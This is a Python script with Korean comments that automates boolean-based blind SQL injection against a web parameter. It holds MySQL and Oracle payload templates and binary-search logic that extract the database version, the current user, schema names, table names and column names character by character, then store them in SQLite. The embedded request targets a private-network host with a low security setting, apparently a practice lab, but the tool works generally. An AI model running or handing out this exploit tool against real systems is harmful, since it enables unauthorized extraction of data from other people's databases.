# 
####################
# 1. 파일에서 리퀘스트 값 받아오기 
# 2. POST 문제 해결 # 대충 해결함
# 3. 다른 데이터베이스 페이로드 생성 # MYSQL, ORACLE 완료
# 4. 데이터 출력 구현,  조회해서 나온 값을 (테이블 생성하고 각 컬럼들 값들을 SQLite에 테이블 그대로 복사느낌으로 저장)

# -*- coding: utf-8 -*-   
from time import sleep
import sys
import urllib
import requests
import warnings
import argparse
import sqlite3
warnings.filterwarnings('ignore')

# 전역변수
output_check = False
args = None
true_message_size = None # 참(ture)의 경우 message size


REQUEST_STRING = """
POST / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Connection: keep-alive
Host: 192.168.219.100:5001
Accept-Language: ko-KR,ko;q=0.9
Upgrade-Insecure-Requests: 1
Cookie: security_level=0; PHPSESSID=117eca5e7194d9415b200e7a15200933
Content-Type: application/x-www-form-urlencoded
Content-Length: 83

username='%7C%7C(case+when+1=1+then+'kazal92'+else+'test'+end)%7C%7C'&password=1234"""


# REQUEST_STRING = """
# GET /?username='||(case+when+1=1+then+'kazal92'+else+'test'+end)||'&password=1234 HTTP/1.1
# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
# Accept-Encoding: gzip, deflate, br
# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
# Connection: keep-alive
# Host: 192.168.219.100:5001
# Accept-Language: ko-KR,ko;q=0.9
# Upgrade-Insecure-Requests: 1
# Cookie: security_level=0; PHPSESSID=117eca5e7194d9415b200e7a15200933


# """

class Colors:
	""" ANSI color codes """
	BLACK = "\033[0;30m"
	RED = "\033[0;31m"
	GREEN = "\033[0;32m"
	BROWN = "\033[0;33m"
	BLUE = "\033[0;34m"
	PURPLE = "\033[0;35m"
	CYAN = "\033[0;36m"
	LIGHT_GRAY = "\033[0;37m"
	DARK_GRAY = "\033[1;30m"
	LIGHT_RED = "\033[1;31m"
	LIGHT_GREEN = "\033[1;32m"
	YELLOW = "\033[1;33m"
	LIGHT_BLUE = "\033[1;34m"
	LIGHT_PURPLE = "\033[1;35m"
	LIGHT_CYAN = "\033[1;36m"
	LIGHT_WHITE = "\033[1;37m"

	BOLD = "\033[1m"
	FAINT = "\033[2m"
	ITALIC = "\033[3m"
	UNDERLINE = "\033[4m"
	BLINK = "\033[5m"
	NEGATIVE = "\033[7m"
	CROSSED = "\033[9m"
	END = "\033[0m"
	# cancel SGR codes if we don't write to a terminal
	if not __import__("sys").stdout.isatty():
		for _ in dir():
			if isinstance(_, str) and _[0] != "_":
				locals()[_] = ""
	else:
		# set Windows console in VT mode
		if __import__("platform").system() == "Windows":
			kernel32 = __import__("ctypes").windll.kernel32
			kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
			del kernel32

class ArgumentProcessor:
	def __init__(self):
		self.args = self.get_argument()

	def get_argument(self):
		parser = argparse.ArgumentParser()
		parser.add_argument("-s",dest="schema", help="http? https?")
		parser.add_argument("-p", dest="parameter", help="target param")
		parser.add_argument("-d", dest="result_db", help="Database name for storing results ex) -d result_db.db")

		parser.add_argument("-D", dest="select_db", help="select DB")
		parser.add_argument("-T", dest="select_table", help="select Table")
		parser.add_argument("-C", dest="select_column", help="select Column")
		parser.add_argument("--proxy", dest="proxy", help="Use a proxy to connect to the target URL")
		parser.add_argument("--dbms", dest="dbms", help="SELECT DBMS : MySQL, Oracle, MSSQL, PostgreSQL")
		parser.add_argument("--basic", action="store_true", help="Basic info extraction")
		parser.add_argument("--dbs", action="store_true", help="Enumerate DBMS databases")
		parser.add_argument("--tables", action="store_true", help="Enumerate Tables")
		parser.add_argument("--columns", action="store_true", help="Enumerate columns")

		options = parser.parse_args()
		if not options.parameter or not options.schema: # 수정해야됨
			parser.error("[-] Missing required parameters: --param, --schema are required. Use --help for more info.")
		return options

class SQLiteProcessor:
	@classmethod
	def __init__(cls):
		global cursor, conn
		conn = sqlite3.connect(args.result_db) 
		cursor = conn.cursor()

		# 기본 테이블 생성 (DB, Table, Column)
		cursor.execute('CREATE TABLE IF NOT EXISTS basic_info (id INTEGER PRIMARY KEY AUTOINCREMENT, version VARCHAR(255), user VARCHAR(255), UNIQUE(Version, user))')
		cursor.execute('CREATE TABLE IF NOT EXISTS dbs_info (id INTEGER PRIMARY KEY AUTOINCREMENT, db_name VARCHAR(255), UNIQUE(db_name))')
		cursor.execute('CREATE TABLE IF NOT EXISTS table_info (id INTEGER PRIMARY KEY AUTOINCREMENT, db_name VARCHAR(255), table_name VARCHAR(255), UNIQUE(db_name, table_name))')
		cursor.execute('CREATE TABLE IF NOT EXISTS column_info (id INTEGER PRIMARY KEY AUTOINCREMENT, db_name VARCHAR(255), table_name VARCHAR(255), column_name VARCHAR(255), UNIQUE(db_name, table_name, column_name))')
	# def result_table_create():
		
	def result_set_name(insert_db_data, select_table_one=None, field=None): # 중복코드 추후 수정
		if args.basic:

			if field == 'Version':
				cursor.execute("INSERT OR IGNORE INTO basic_info (version) VALUES (?)", (insert_db_data,))
			elif field == 'User':
				cursor.execute("UPDATE basic_info SET user = ? WHERE id = ?", (insert_db_data, 1))
			cursor.execute("DELETE FROM basic_info WHERE id != 1;")
			conn.commit()
		elif args.dbs:
			cursor.execute("INSERT OR IGNORE INTO dbs_info (db_name) VALUES (?)", (insert_db_data,))
			conn.commit()
		elif args.tables:
			cursor.execute("INSERT OR IGNORE INTO table_info (db_name, table_name) VALUES (?, ?)", (args.select_db, insert_db_data))
			conn.commit()
		elif args.columns:
			cursor.execute("INSERT OR IGNORE INTO column_info (db_name, table_name, column_name) VALUES (?, ?, ?)", (args.select_db, select_table_one, insert_db_data))
			conn.commit()


def url_encode(item):
	return urllib.parse.quote(item).replace('%20', '+').replace('%3D', '=').replace('%27', '\'').replace('%28','(').replace('%29',')').replace('%3E', '>').replace('%2C', ',').replace('%3C', '<')

def url_decode(item):
	return urllib.parse.unquote(item).replace('+', ' ')

def parse_request(request):
	headers = {} # 헤더 딕셔너리
	data = {} # GET 파라미터 딕셔너리

	lines = request.split("\n") # 한줄씩 쪼개서 넣기
	method, path_param, http_ver = lines[1].split() # POST /v1/groups/814a75c9-f187-48c8-8c01-a9805212db0e/files/details?AAA=aaa&BBB=bbb HTTP/2

	if method == 'GET': # GET방식일경우 
		path, param_tmp = path_param.split("?") # param = AAA=aaa&BBB=bbb
		param = param_tmp

		for line in lines[2:]:
			if ":" in line:
				key, value = line.split(": ")
				headers[key] = value # 딕셔너리에 {헤더 : 값}
		for get_param in param.split("&"):
			key, value = get_param.split("=", 1)
			data[key] = value # 딕셔너리에 {파라미터 : 값}
		url = headers['Host']   
		condition = url_decode(data[args.parameter])

	else: # 이외 POST 등 일경우 body 값 파싱
		path = path_param.split("?", 1)[0]
		headers_string, data_string = request.split("\n\n")
		for line in headers_string.split("\n"):
			if ":" in line:
				key, value = line.split(": ")
				headers[key] = value
		
		for param in data_string.split("&"):
			key, value = param.split("=", 1)
			data[key] = value
		url = headers['Host']   
		condition = url_decode(data[args.parameter])

	return (
	{
		'method': method,
		'url': url,
		'path': path,
		'headers': headers,
		'data': data,
	}, condition
)
def payload_set(condition, payloads):
	result_payload = {}
	for key, value in payloads.items():
		result_payload[key] = {} # 중첩 딕셔너리 초기화
		for key2, value2 in value.items():
			payload_tmp = condition.replace('1=1', value2)
			result_payload[key][key2] = payload_tmp

	return result_payload

def setpayload():
	global output_check

	dbms = args.dbms.lower()

	if dbms == 'oracle':
		if args.basic:
			print(f"{Colors.LIGHT_RED}{Colors.UNDERLINE}[*] ORACLE 기본 정보 출력 Start{Colors.END}\n")
			payloads = {
				'Version': {
					'count': "",
					'len': "(SELECT LENGTH((SELECT banner FROM V$VERSION WHERE banner LIKE 'Oracle%')) FROM dual)>{mid_val}",
					'version': "ascii(substr((SELECT banner FROM V$VERSION WHERE banner LIKE 'Oracle%'),{substr_index},1))>{mid_val}"
				},
				'User': {
					'count': "",
					'len': "(SELECT LENGTH((SELECT user FROM dual)) FROM dual)>{mid_val}",
					'version': "ascii(substr((SELECT USER FROM dual),{substr_index},1))>{mid_val}"
				},
			}
		if args.dbs:
			print(f"{Colors.LIGHT_RED}{Colors.UNDERLINE}[*] ORACLE DB 출력 Start{Colors.END}\n")
			payloads = {
				'Dbs': {
					'count' : "(SELECT count(*) FROM (SELECT DISTINCT owner FROM all_tables))>{mid_val}",
					'len' : "LENGTH((SELECT owner FROM (SELECT rownum r, owner FROM (SELECT DISTINCT owner FROM all_tables))tb WHERE tb.r={rows}))>{mid_val}",
					'dbs' : "ASCII(SUBSTR((SELECT owner FROM (SELECT rownum r, owner FROM (SELECT DISTINCT owner FROM all_tables))tb WHERE tb.r={rows}),{substr_index},1))>{mid_val}"
				}
			}
		if args.tables:
			print(f"{Colors.LIGHT_RED}{Colors.UNDERLINE}[*] ORACLE 테이블 출력 Start{Colors.END}\n")
			payloads = {
				'Tables': {
					'count' : "(SELECT count(*) FROM all_tables WHERE owner='{select_db}')>{mid_val}",
					'len' : "LENGTH((SELECT table_name FROM (SELECT rownum r, table_name FROM all_tables WHERE owner='{select_db}')tb WHERE tb.r={rows}))>{mid_val}",
					'tables' : "ascii(SUBSTR((SELECT table_name FROM (SELECT rownum r, table_name FROM all_tables WHERE owner='{select_db}')tb WHERE tb.r={rows}),{substr_index},1))>{mid_val}"
				}	
			}
		if args.columns:
			print(f"{Colors.LIGHT_RED}{Colors.UNDERLINE}[*] ORACLE 컬럼 출력 Start{Colors.END}\n")
			payloads = {
				'Columns': {
					'count' : "(SELECT count(*) FROM all_tab_columns WHERE owner='{select_db}' AND table_name='{select_table}')>{mid_val}",
					'len' : "LENGTH((SELECT column_name FROM (SELECT rownum r, column_name FROM all_tab_columns WHERE owner='{select_db}' AND table_name='{select_table}')tb WHERE tb.r={rows}))>{mid_val}",
					'columns' : "ASCII((SUBSTR((SELECT column_name FROM (SELECT rownum r, column_name FROM all_tab_columns WHERE owner='{select_db}' AND table_name='{select_table}')tb WHERE tb.r={rows}),{substr_index},1)))>{mid_val}"
				}
			}
					# 오라클
####################################################################################################################################################################################################
					# MYSQL
	elif dbms == 'mysql':
		if args.basic:
			print(f"{Colors.LIGHT_RED}{Colors.UNDERLINE}[*] MySQL 기본 정보 출력 Start{Colors.END}\n")
			payloads = {
				'Version': {
					'count': "",
					'len': "(SELECT length((SELECT @@version)))>{mid_val}",
					'version': "ascii(substr((SELECT @@version),{substr_index},1))>{mid_val}"
				},
				'User': {
					'count': "",
					'len': "(SELECT length((SELECT user())))>{mid_val}",
					'version': "ascii(substr((SELECT user()),{substr_index},1))>{mid_val}"
				},
			}
		if args.dbs:
			print(f"{Colors.LIGHT_RED}{Colors.UNDERLINE}[*] MySQL DB 출력 Start{Colors.END}\n")
			payloads = {
				'Dbs': {
					'count' : "(SELECT count(*) FROM information_schema.schemata WHERE schema_name NOT IN('mysql','information_schema'))>{mid_val}",
					'len' : "(SELECT length((SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN('mysql','information_schema') LIMIT {rows},1)))>{mid_val}",
					'dbs' : "ascii(substr((SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN('mysql','information_schema') LIMIT {rows},1),{substr_index},1))>{mid_val}"
				}
			}
		if args.tables:
			print(f"{Colors.LIGHT_RED}{Colors.UNDERLINE}[*] MySQL 테이블 출력 Start{Colors.END}\n")
			payloads = {
				'Tables': {
					'count' : "(SELECT count(*) FROM information_schema.tables WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}'))>{mid_val}",
					'len' : "(SELECT length((SELECT table_name FROM information_schema.tables WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') LIMIT {rows},1)))>{mid_val}",
					'tables' : "ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') LIMIT {rows},1),{substr_index},1))>{mid_val}"
				}
			}
		if args.columns:
			print(f"{Colors.LIGHT_RED}{Colors.UNDERLINE}[*] MySQL 컬럼 출력 Start{Colors.END}\n")
			payloads = {
				'Columns': {
					'count' : "(SELECT count(*) FROM information_schema.columns WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') AND table_name IN('{select_table}'))>{mid_val}",
					'len' : "(SELECT length((SELECT column_name FROM information_schema.columns WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') AND table_name IN('{select_table}') LIMIT {rows},1)))>{mid_val}",
					'columns' : "ascii(substr((SELECT column_name FROM information_schema.columns WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') AND table_name IN('{select_table}') LIMIT {rows},1),{substr_index},1))>{mid_val}"
				}
			}
		
	return payloads

def check_condition(data, method, url, path, headers):
	data[args.parameter] = url_decode(data[args.parameter])

	global true_message_size
	params = '&'.join([f"{key}={value}" for key, value in data.items()])      
	proxies = {'http': args.proxy, 'https': args.proxy}
	timeout = 30
	if method == 'GET':
		url = f"{args.schema}://{url}{path}?{params}" # HTTP , HTTPS 입력 sechma
		response = requests.request(method, url, headers=headers, proxies=proxies, timeout=timeout, verify=False)
		true_message_size = len(response.content) # 저장
	else:
		url = f"{args.schema}://{url}{path}" # HTTP , HTTPS 입력 sechma
		response = requests.request(method, url, headers=headers, data=data, proxies=proxies, timeout=timeout, verify=False)
		true_message_size = len(response.content) # 저장

	
def recursive(min_val, max_val, data_val, payload_fix, substr_index=None, rows_=None, select_db=None, select_table=None, select_column=None):
	mid_val = int((min_val+max_val)/2)
	payload_insert = payload_fix
	
	payload_insert = payload_insert.format(rows=rows_, substr_index=substr_index, mid_val=mid_val, select_db=select_db, select_table=select_table, select_column=select_column)
	# print(payload_insert) # 페이로드 확인
	data_val['data'][args.parameter] = payload_insert
	
	bin_result = connection(**data_val) # payload 삽입 및 요청
	if max_val - min_val <= 1:
		if bin_result:
			return max_val
		return min_val         
	if bin_result: # 30 130 160 / 2 = 80
		return recursive(mid_val, max_val, data_val, payload_fix, substr_index, rows_, select_db, select_table, select_column)
	return     recursive(min_val, mid_val, data_val, payload_fix, substr_index, rows_, select_db, select_table, select_column)
		
def connection(data, method, url, path, headers):
	
	data[args.parameter] = url_decode(data[args.parameter])

	params = '&'.join([f"{key}={value}" for key, value in data.items()])      
	# print(params) # 요청전 최종 페이로드 확인
	proxies = {'http': args.proxy, 'https': args.proxy}
	timeout = 30
	if method == 'GET':
		url = f"{args.schema}://{url}{path}?{params}" # HTTP , HTTPS 입력 sechma
		response = requests.request(method, url, headers=headers, proxies=proxies, timeout=timeout, verify=False)
		check_message_size = response.content

	else:
		url = f"{args.schema}://{url}{path}" # HTTP , HTTPS 입력 sechma
		response = requests.request(method, url, headers=headers, data=data, proxies=proxies, timeout=timeout, verify=False)
		check_message_size = len(response.content)

	if true_message_size == check_message_size:
		return 1    # true
	return 0    # false

def query_start():
	row_count = 1 # 행 개수
	name_tmp = []
	result_tmp = []
	result_data = {}
	data_len  = 0
	select_tables = [None] # --dbs, --tables 를 실행할때는 None으로 설정
	dbms = args.dbms.lower()

	payloads = setpayload() # 인수에 따른 페이로드 셋팅
	data, condition = parse_request(REQUEST_STRING) # 응답데이터 파싱
	check_condition(**data) # True 응답 길이 저장 (참거짓 구분 용도) 	
	result_payload = payload_set(condition, payloads) # 조건식에서 1=1 을 페이로드로 리플레이스


	if args.select_table != None: # 테이블의 컬럼을 여러개 선택하는 경우 ex) -C blog, movies
		select_tables = [] # --Columns의 경우 None 값 초기화
		select_tmp = args.select_table.split(',')
		for tmp in select_tmp: # 컬럼 여러개 선택한 경우 갯수만큼 반복
			tmp2 = tmp.replace("'","").strip()			
			select_tables.append(tmp2)

	for select_table_one in select_tables:
		if not args.basic:
			for key, value in result_payload.items():
				row_count = recursive(0, 127, data, result_payload[key]['count'],None, None, args.select_db, select_table_one, None)
		else:
			row_count = 1
		print(f"{Colors.LIGHT_BLUE}[*] '{Colors.LIGHT_BLUE}{select_table_one}'{Colors.END} {Colors.LIGHT_PURPLE}라인 개수 : {str(row_count)}{Colors.END}" if select_table_one else f"{Colors.LIGHT_BLUE}[*] 레코드 수 : {str(row_count)}{Colors.END}")

		for rows in range(0, row_count, 1):  # 레코드 갯수 만큼 반복  # range(row_count)로 해도됨
			for key, value in result_payload.items():
				name_tmp.append(key)
				for key2, value2 in list(value.items())[1:]: #딕셔너리를 리스트로 변환 후 첫번째 값(count)는 제외하고 실행 
					if key2 == 'len':
						if dbms == 'oracle': # 오라클일 경우 rownum은 1부터 시작하기에 + 1 해야됨
							rows+=1 		 # 길이를 구하고 이름을 뽑고하는 방식이기 때문에 길이를 구할때만 +1하면됨
						data_len  = recursive(0, 127, data, value2, None, rows, args.select_db, select_table_one, None)
						print(f"[*] 길이 : " + str(data_len))
					else:
						name_str = ""
						for substr_index in range(0, data_len, 1): # 데이터 글자 수 만큼 반복
							name_str += chr(recursive(0, 127, data, value2, substr_index+1, rows, args.select_db, select_table_one, None))
							# print(name_str)
						SQLiteProcessor.result_set_name(name_str, select_table_one, key) # SQLite에 데이터 저장
						result_tmp.append(name_str)
						print(f"[*] {result_tmp}")

			
		if args.basic :
			num = 0
			for name in name_tmp:
				result_data[name] = result_tmp[num]
				num = num + 1
				print(f"{Colors.LIGHT_BLUE}[*] {Colors.END}{Colors.GREEN}{result_data}{Colors.END}")
		else:
			if select_table_one:
				result_data[select_table_one] = result_tmp
			else:
				result_data[list(name_tmp)[0]] = result_tmp
			print(f"{Colors.LIGHT_BLUE}[*] '{select_table_one}' {Colors.END} : {Colors.GREEN}{result_data[select_table_one]}{Colors.END}" if select_table_one else f"{Colors.LIGHT_BLUE}[*] '{list(name_tmp)[0]}' 데이터 : {result_data[list(name_tmp)[0]]}{Colors.END}")
		result_tmp = [] # 레코드 모두 추출 후 초기화

	print(f"\n{Colors.LIGHT_RED}{Colors.BOLD}{Colors.UNDERLINE}[*] 최종 결과{Colors.END}")
	for key, value in result_data.items(): 
		print(f"{Colors.LIGHT_BLUE}{key}{Colors.END} : {Colors.GREEN}{value}{Colors.END}")
	print(f"\n{Colors.LIGHT_RED}[*] SQLite 저장 완료!{Colors.END}")

	print("\n")	
		
if __name__ == '__main__':
	arg_processor = ArgumentProcessor()
	args = arg_processor.args # 인스턴스 생성
	SQLiteProcessor() # SQLite 초기화

	print (f"\n{Colors.LIGHT_RED}{Colors.BOLD}================================================================={Colors.END}")
	print (f"{Colors.LIGHT_RED}{Colors.BOLD}                    Blind SQL Injection START{Colors.END}")
	print (f"{Colors.LIGHT_RED}{Colors.BOLD}================================================================={Colors.END}\n")
	query_start()